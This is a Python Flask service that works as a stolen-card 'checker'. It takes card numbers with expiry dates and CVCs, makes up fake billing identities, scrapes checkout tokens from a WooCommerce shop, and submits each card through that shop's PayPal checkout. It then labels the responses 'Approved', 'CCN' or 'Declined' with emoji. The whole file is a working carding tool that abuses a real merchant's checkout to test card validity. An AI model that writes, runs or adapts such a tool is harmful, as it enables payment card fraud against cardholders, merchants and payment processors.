import os
import requests
import re
import random
import string
from flask import Flask, request, jsonify
from requests_toolbelt.multipart.encoder import MultipartEncoder
import user_agent

# Initialize Flask app
app = Flask(__name__)

# --- Helper functions ---
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    index = random.randint(0, len(cities) - 1)
    return (
        cities[index],
        states[index],
        f"{random.randint(1, 999)} {random.choice(streets)}",
        zip_codes[index],
    )

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=15)) + str(random.randint(1000,9999)) + "@gmail.com"

def generate_phone_number():
    return f"303{''.join(random.choices(string.digits, k=7))}"

# --- Main checking logic ---
def check_card(card_details):
    try:
        n, mm, yy, cvc = card_details.strip().split('|')
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        r = requests.session()

        # Generate fake billing info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()

        # 1. Add to cart
        multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
        r.post(
            'https://switchupcb.com/shop/i-buy/',
            headers={'user-agent': user, 'content-type': multipart_data.content_type},
            data=multipart_data
        )

        # 2. Get checkout tokens
        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user})
        try:
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
        except AttributeError:
            return {"status": "Error", "message": "Failed to scrape checkout tokens.", "response_text": ""}

        # 3. Create PayPal Order
        json_data_create = {
            'nonce': create,
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        }
        response_create = r.post(
            'https://switchupcb.com/?wc-ajax=ppc-create-order',
            json=json_data_create,
            headers={'user-agent': user}
        )

        order_data = response_create.json()
        if 'data' not in order_data or 'id' not in order_data['data']:
            return {"status": "Error", "message": "Failed to create PayPal order ID.", "response_text": str(order_data)}

        paypal_id = order_data['data']['id']

        # 4. Final GraphQL payment request to PayPal
        json_data_graphql = {
            'query': 'mutation payWithCard($token: String!, $card: CardInput!) { approveGuestPaymentWithCreditCard(token: $token, card: $card) { flags { is3DSecureRequired } } }',
            'variables': {
                'token': paypal_id,
                'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc},
            }
        }
        response_final = requests.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            headers={'user-agent': user, 'content-type': 'application/json'},
            json=json_data_graphql
        )

        # Raw JSON string from PayPal
        last = response_final.text.strip()

        # --- Decide status & message ---
        if ('ADD_SHIPPING_ERROR' in last or '"status": "succeeded"' in last or 'Thank You For Donation.' in last):
            return {"status": "Approved", "message": "CHARGE ✅", "response_text": last}
        elif 'is3DSecureRequired' in last:
            return {"status": "Approved (3D Secure)", "message": "OTP 💥 [3D]", "response_text": last}
        elif 'INVALID_SECURITY_CODE' in last:
            return {"status": "Approved (CCN)", "message": "APPROVED CCN ✅", "response_text": last}
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return {"status": "Approved", "message": "APPROVED! ✅ - [EXISTING_ACCOUNT_RESTRICTED]", "response_text": last}
        elif 'INVALID_BILLING_ADDRESS' in last:
            return {"status": "Approved", "message": "APPROVED! ✅ - [inv_address]", "response_text": last}
        else:
            return {"status": "Declined", "message": "DECLINED ❌", "response_text": last}

    except Exception as e:
        return {"status": "Error", "message": str(e), "response_text": ""}

# --- API Endpoint ---
@app.route('/check', methods=['GET'])
def api_check():
    card_info = request.args.get('cc')
    if not card_info:
        return jsonify({"status": "Error", "message": "Missing 'cc' parameter"}), 400
    if len(card_info.split('|')) != 4:
        return jsonify({"status": "Error", "message": "Invalid card format"}), 400
    
    result = check_card(card_info)
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
